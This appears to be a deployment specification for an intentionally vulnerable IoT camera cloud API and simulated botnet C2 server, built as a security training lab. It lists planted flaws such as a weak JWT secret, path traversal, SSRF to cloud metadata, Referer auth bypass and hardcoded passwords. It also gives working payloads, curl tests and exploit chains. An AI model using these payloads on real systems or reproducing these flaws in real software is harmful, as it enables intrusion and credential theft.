# OwlCam Cloud API (Layer 2 Sub-stage)

**Stage Purpose**: Deploy Dockerized cloud backend for OwlCam IP cameras with intentional security vulnerabilities for IoT/cloud security training.

**Parent Stage**: `cloud_api/`

## Inputs

| Layer | Source Path | Role/Description |
|-------|-------------|------------------|
| **Layer 2 (Parent)** | `cloud_api/CONTEXT.md` | Global cloud API routing and patterns |
| **Layer 3** | `docs/cloud/` | API specifications, cloud architecture |
| **Layer 3** | `docs/OwlCam/` | Camera-specific vulnerabilities |
| **Layer 4** | `docker-compose.yml` | Service orchestration |
| **Layer 4** | `api_server/` | Flask API with JWT, support system, C2 proxy |
| **Layer 4** | `c2_server/` | Command & Control SSE server |
| **Layer 4** | `camera_sim/` | Simulated camera stream generator |

## Process

### 1. Analyze Deployment Requirements

**Components:**
| Component | Type | Technology | Port | Purpose |
|-----------|------|------------|------|---------|
| API Server | Docker | Python/Flask + MongoDB | 5000 | Main API backend |
| C2 Server | Docker | Python/Flask + SSE | 4999 | Botnet C2 simulation |
| Camera Sim | Docker | Python/OpenCV | 9090 | Video simulation |

**Database Schema (MongoDB):**
```javascript
// vulnzoo_vuln.users
db.users.insert({
    username: String,
    password: String,  // bcrypt hashed
    role: String,      // user, viewer, admin
    cameras_access: Array
})

// vulnzoo_vuln.messages
db.messages.insert({
    sender_id: ObjectId,
    sender_username: String,
    recipient_id: ObjectId,
    message: String,
    timestamp: ISODate
})

// vulnzoo_vuln.support_requests
db.support_requests.insert({
    ticket_id: Number,
    user_id: ObjectId,
    issue_type: String,
    attached_file_name: String,
    attached_file_data: String  // base64 encoded
})

// vulnzoo_vuln.sessions
db.sessions.insert({
    user_id: ObjectId,
    role: String,
    ip: String,
    timestamp: ISODate
})
```

### 2. Apply Vulnerability Configuration

**JWT Vulnerabilities (Critical):**

| Vuln # | Type | Location | Evidence |
|--------|------|----------|----------|
| #1 | Weak Secret | `config.py:44` | `JWT_SECRET_KEY = 'default_secret_key'` |
| #2 | Algorithm Confusion | `jwt_service.py:38` | Accepts `none` algorithm |
| #3 | No Verification | `jwt_service.py:81-93` | `decode_without_verification()` endpoint |
| #4 | Debug Endpoint | `app.py:80-104` | `/api/debug/decode_token` bypasses signature |
| #5 | Weak C2 Token | `c2_diag.py:43` | `sum(int(c,16)) % 7 == 0` validation |

**Path Traversal / LFI (Critical):**

| Vuln # | Type | Location | Evidence |
|--------|------|----------|----------|
| #6 | File Read | `app.py:121-126` | `/api/status?feature=cpu_info` exposes `/proc/cpuinfo` |
| #7 | Path Traversal | `app.py:122` | Weak `replace("../", "")` sanitization |
| #8 | File Write | `app.py:127-134` | PUT method allows file modification via `feature` param |

**SSRF (High):**

| Vuln # | Type | Location | Evidence |
|--------|------|----------|----------|
| #9 | SSRF | `app.py:460-463` | `process_support_file()` fetches URLs from uploaded HTML |

**Authentication Bypass (High):**

| Vuln # | Type | Location | Evidence |
|--------|------|----------|----------|
| #10 | ID Exposure | `app.py:209, 348` | Admin `sender_id` exposed in messages/support responses |
| #11 | Referer Bypass | `app.py:587-588` | `if '/admin' in referer:` check only |
| #12 | Missing Auth | `app.py:555` | `/admin/users/search` without `@admin_required` |
| #13 | Session Fixation | `app.py:64-70` | Cookie-based session without proper validation |

**Injection Vulnerabilities (Critical/High):**

| Vuln # | Type | Location | Evidence |
|--------|------|----------|----------|
| #14 | Template Injection | `app.py:546` | `render_template_string` potential XSS |
| #15 | Error Exposure | `app.py:69-77` | Global error handler exposes stack traces |

**Hardcoded Credentials (Critical):**

```python
# config.py:55
C2_PANEL_PASSWORD = "letstechin"

# config.py:44
JWT_SECRET_KEY = os.getenv('JWT_SECRET_KEY', 'default_secret_key')  # Insecure default
```

**C2 Server Vulnerabilities:**

| Vuln # | Type | Location | Evidence |
|--------|------|----------|----------|
| #16 | Weak Token | `c2_server.py:73-82` | `validate_token()` uses hex sum mod 7 |
| #17 | No Rate Limiting | `c2_server.py:125-164` | SSE endpoint without auth rate limits |
| #18 | Info Disclosure | `c2_server.py:115-123` | `/health` exposes active session count |

### 3. Transform (Deployment Steps)

**Step 1: Deploy Docker Environment:**
```bash
cd cloud_api/owlcam
docker-compose up -d --build
# Services: api_server (:5000), c2_server (:4999), mongo (:27017)
```

**Step 2: Initialize Database:**
```bash
# Auto-initialized on first run
# Default users created:
# - john:doe123 (standard user)
# - admin:<JWT forgery> (admin via exploitation)
```

**Step 3: Configure Vulnerabilities:**

| Endpoint | Vulnerability | Payload |
|----------|---------------|---------|
| `/api/v2/login` | JWT Weak Secret | Crack with `hashcat -m 16500` |
| `/api/debug/decode_token` | Token Decoding | POST any JWT to view payload |
| `/api/status?feature=...` | LFI/Path Traversal | `feature=....//etc/passwd` |
| `/api/status` (PUT) | Arbitrary File Write | `PUT /api/status?feature=test.txt` with body |
| `/admin/users/search?query=...` | NoSQL Injection | `query=admin` returns all matching |
| `/api/support/modify` | SSRF | Upload HTML with `<img src="http://internal">` |
| `/admin/users/<id>` (DELETE) | Auth Bypass | Set `Referer: /admin` header |
| `/c2` | C2 Panel Access | Password from LFI or brute force |

### 4. Refine

**Verification Steps:**
```bash
# Test JWT weakness
curl -X POST http://localhost:5000/api/v2/login \
  -H "Content-Type: application/json" \
  -d '{"username":"john","password":"doe123"}'
# Response contains JWT - crack with hashcat

# Test LFI
curl "http://localhost:5000/api/status?feature=....//....//etc/passwd"

# Test C2 token validation
curl -H "X-Diag-Token: 000000" http://localhost:4999/stream
# 000000 is valid (sum=0, 0%7==0)

# Test admin ID exposure
curl -H "X-Auth-Token: <token>" http://localhost:5000/api/messages
# Look for sender_id field in response
```

## Outputs

| Artifact | Path/Port | Description |
|----------|-----------|-------------|
| API Server | `:5000` | Flask backend with vulnerable JWT |
| C2 Server | `:4999` | SSE-based command & control |
| MongoDB | `:27017` | User/camera/message data |
| Camera Sim | `:9090` | MJPEG video stream |

## Vulnerability Chains

### Chain 1: JWT Weak Secret → Admin Access → User Deletion
```
POST /api/v2/login → Get JWT
  ↓
hashcat -m 16500 JWT → Crack "default_secret_key"
  ↓
Forge admin JWT with captured admin_id from /api/messages
  ↓
DELETE /admin/users/<id> with forged token → Delete any user
```

### Chain 2: LFI → C2 Credentials → Device Takeover
```
GET /api/status?feature=....//proc/self/environ → Find C2_PANEL_PASSWORD
  ↓
Access /c2 panel with credentials "letstechin"
  ↓
Generate valid C2 token (hex sum % 7 == 0, e.g., "000000")
  ↓
Connect to SSE stream, send commands to backdoored devices
```

### Chain 3: SSRF → Internal Service Discovery → Cloud Metadata
```
POST /api/support/modify with HTML containing:
<img src="http://169.254.169.254/latest/meta-data/">
  ↓
Server fetches cloud metadata
  ↓
Extract IAM credentials from response
```

### Chain 4: Referer Bypass → User Search → ID Enumeration
```
GET /admin/users/search?query=a with Referer containing /admin
  ↓
Enumerate all users via regex search
  ↓
Delete users via DELETE /admin/users/<id> with forged Referer
```

## API Vulnerabilities (OWASP API Top 10 2023)

| ID | Vulnerability | Endpoint | Evidence |
|----|---------------|----------|----------|
| API1:2023 | Broken Object Level Authorization | `/snapshot` | Token-only auth, no camera ownership check |
| API2:2023 | Broken Authentication | `/api/v2/login` | Weak JWT secret, algorithm confusion |
| API3:2023 | Broken Object Property Level Authorization | `/api/messages` | Exposes sender_id, recipient_id |
| API5:2023 | Broken Function Level Authorization | `/admin/users/*` | Referer-based bypass |
| API6:2023 | Unrestricted Access to Business Flows | `/api/support/modify` | No rate limiting on file uploads |
| API7:2023 | SSRF | `/api/support/modify` | Fetches URLs from uploaded files |
| API8:2023 | Security Misconfiguration | `/api/status` | Exposes system files, debug endpoints |
| API9:2023 | Improper Inventory Management | `/api/debug/*` | Debug endpoints exposed in production |
| API10:2023 | Unsafe API Consumption | `/messages` | Trusts client-provided sender fields |

## IoT Vulnerabilities (OWASP IoT Top 10 2018)

| ID | Vulnerability | Evidence |
|----|---------------|----------|
| IoT:I1 | Weak Passwords | Hardcoded C2_PANEL_PASSWORD, JWT default secret |
| IoT:I2 | Insecure Services | Debug endpoints, C2 SSE without proper auth |
| IoT:I4 | Insecure Update | File upload via PUT /api/status allows RCE |
| IoT:I5 | Insecure Components | PyJWT vulnerable to algorithm confusion |
| IoT:I6 | Insufficient Privacy | Exposes user IDs, admin info in API responses |
| IoT:I7 | No Secure Communication | C2 SSE without TLS, JWT over HTTP |

## Dependencies

| Component | Requirement |
|-----------|-------------|
| Platform | Docker + Docker Compose |
| Database | MongoDB 6.0+ |
| Python | 3.11+ with flask, pymongo, pyjwt, bcrypt |
| Network | Bridge to 192.168.2.0/24 |
| Volumes | `/vulnzoo/firmware` for file uploads |

## Verification Checklist

- [ ] API responds at `http://localhost:5000/`
- [ ] JWT can be cracked with `hashcat -m 16500`
- [ ] `/api/status?feature=....//etc/passwd` returns system file
- [ ] `/api/debug/decode_token` decodes tokens without verification
- [ ] C2 server accepts token `000000` on `/stream`
- [ ] Admin ID is exposed in `/api/messages` response
- [ ] Referer bypass works on `/admin/users/search`
- [ ] SSRF triggers via file upload to `/api/support/modify`

## References

- Docs: `docs/OwlCam/API/Vulnerabilities.md`
- C2 Architecture: `docs/OwlCam/Mobile/ARCHITECTURE_SSE_C2.md`
- OWASP API Top 10: 2023
- OWASP IoT Top 10: 2018
- JWT Attacks: https://portswigger.net/web-security/jwt
